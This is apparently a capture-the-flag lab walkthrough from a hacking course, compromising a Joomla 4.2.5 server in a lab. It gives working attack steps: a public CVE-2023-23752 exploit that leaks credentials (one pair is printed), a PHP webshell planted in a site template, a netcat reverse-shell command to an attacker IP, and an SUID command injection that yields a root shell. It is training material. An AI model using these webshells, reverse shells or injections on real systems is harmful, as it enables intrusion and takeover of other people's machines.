# URL
https://www.hacksmarter.org/courses/3b3f3073-3242-4aee-9bcd-0fb058ce4e13/
# Concept
* Joomla CMS exploitation
* using the Joomscan tool
* researching known exploits for software versions
* 
# Method of solve
## Beginning scans
* there are only ports 22 and 80 open
* using directory busting, we find the `/administrator` endpoint
  * that endpoint lets us know that we're dealing with a `Joomla` CMS app
* there are specific tools used for security scanning on `Joomla`:
```
https://github.com/OWASP/joomscan
```
* using Joomscan, we get the version of Joomla being used:
```
perl joomscan.pl --url http://10.1.128.114/
```
* this lets us know that the version of `Joomla` is `4.2.5`
* if we search for `Joomla 4.2.5 exploit`, then the AI helpfully lets us know that there's a CVE associated with a sensitive data exposure vulnerability associated with `Joomla` `4.2.5`
* there's a Github project that exploits this one over here:
```
https://github.com/Acceis/exploit-CVE-2023-23752
```
* using this tool exposes usernames and passwords for this target:
```
gem install httpx docopt paint
ruby exploit.rb http://10.1.128.114
```
* specifically, we're told about the following username and password:
```
miyamoto:Pa847word987@Joomla456
```
* this is an example of password reuse
## Initial Access
* now that we have Admin access to the Joomla CMS, we can get a webshell on the app through editing the templates on the app
* From the admin dashboard, it's: `System -> Site Templates -> Cassiopeia Details and Files -> index.php`
  * now you're editing the `index.php` file
  * insert the following webshell code inside the PHP tags:
  ```
  system($_GET['cmd']);
  ```
  * click on `Save and Close` at the top of the screen
* now we access the webshell from `/templates/cassiopeia/index.php`
* we can append to the end of the endpoint `?cmd=your_command_here` to run system commands
* we'll use a reverse shell payload from `revshells.com`:
  ```
  busybox nc 10.200.81.223 443 -e /bin/bash
  ```
## Privilege Escalation
* we notice a suspicious directory and file in the `/opt` directory, `/backup/DbMaria`
* this file is a custom binary used to a tool called `mariadb-dump`
* the exact command used to run the tool can be found by enumerating strings on the binary:
```
mariadb-dump --socket=/run/mysqld/mysqld.sock -u root %s > /tmp/backup.sql
```
* this command is vulnerable to OS command injection because it doesn't sanitize the arguments sent to the command
* so we can inject OS commands into this binary (which is running as SUID, owned by root) with a payload like this:
```
./DbMaria '"fakedb"; <YOUR_COMMANDS_HERE>'
```
* using this injection, we can create a `rootbash` binary in the `/tmp` directory (SUID bash binary):
```
./DbMaria '"fakedb"; cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash'
```
* then run the rootbash binary to get root access:
```
/tmp/rootbash -p
```
* finished
